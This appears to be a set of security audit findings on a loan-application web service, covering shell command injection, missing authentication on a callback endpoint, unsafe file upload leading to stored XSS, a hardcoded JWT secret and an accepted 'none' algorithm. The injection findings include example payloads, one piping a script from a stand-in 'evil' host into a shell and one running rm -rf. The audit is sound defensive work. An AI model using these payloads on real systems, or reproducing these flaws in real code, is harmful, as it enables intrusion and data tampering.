extra.message: Command injection in renderDocumentPreviewAs. The attacker-controlled 'x-preview-format' header (line 430) is interpolated directly into the shell command passed to exec(): `exec(`pandoc "${document.filePath}" -o "${outputPath}" -t ${targetFormat}`, ...)`. exec() uses a shell, so a header value such as `pdf; curl http://evil/x.sh | sh; echo` executes arbitrary OS commands as the server process. document.filePath is also influenced by the user-supplied upload filename extension, giving a second injection point.

Command injection in buildExportArchiveBundle. The request-supplied `preset` body field (line 438) is concatenated into a shell command executed via exec(): `exec(`tar -c${preset === 'zip' ? 'j' : 'z'}f ${outputName}.${preset} -C ${bundleDir} .`)`. A preset value like `tar.gz; rm -rf /tmp/x; echo` breaks out of the tar invocation and runs arbitrary commands. The safe sibling endpoint (archive-bundle-v2, line 482) restricts presets via an allowlist and uses spawn() with shell:false, confirming this variant is exploitable.

POST /api/applications/:applicationId/bureau-risk-callback has no authentication or authorization middleware and no shared-secret/signature verification. Any anonymous client that knows/obtains an application UUID can send `x-vendor-tier: trusted` with body `{access:true, riskTier:'low'}` to rewrite the risk tier of a loan application (lines 232-234), corrupting underwriting decisions and fast-tracking an application.

extra.message: Unsafe file upload enabling stored XSS / dangerous file hosting. The multer filter only checks the declared MIME type (trivially spoofable) and preserves the attacker-chosen extension from file.originalname into the stored name (`uuid + ext`). Files land in ./uploads which is served as static content at the same origin (/uploads, server.ts:42). A borrower can upload HTML/JS content with originalname like 'x.html' while declaring 'text/plain' (an allowed type); the file is then served as text/html from the app origin, executing in the lender context and enabling theft of localStorage auth tokens from any staff member who opens the URL.

Anyone who knows this constant (it is in the source) can forge valid HS256 tokens for any userId/role, fully bypassing authentication on every bearer-protected route whenever the environment variable is not configured.

Insecure authorization on GET /api/dashboard/cost-allocation: the endpoint has no authenticate/requireRole middleware and instead trusts a JWT read from the authToken cookie, verifying it with the 'none' algorithm enabled in the allowlist (algorithms: ['HS256','none']). It trusts the token's role/userId claims directly (line 47) without reloading the user from the DB (so disabled users retain access), and combined with the default fallback secret (dashboard.ts:41) a forged token can read aggregate lending data for the whole portfolio (applicationCount, totalOriginated, decisionVolume).
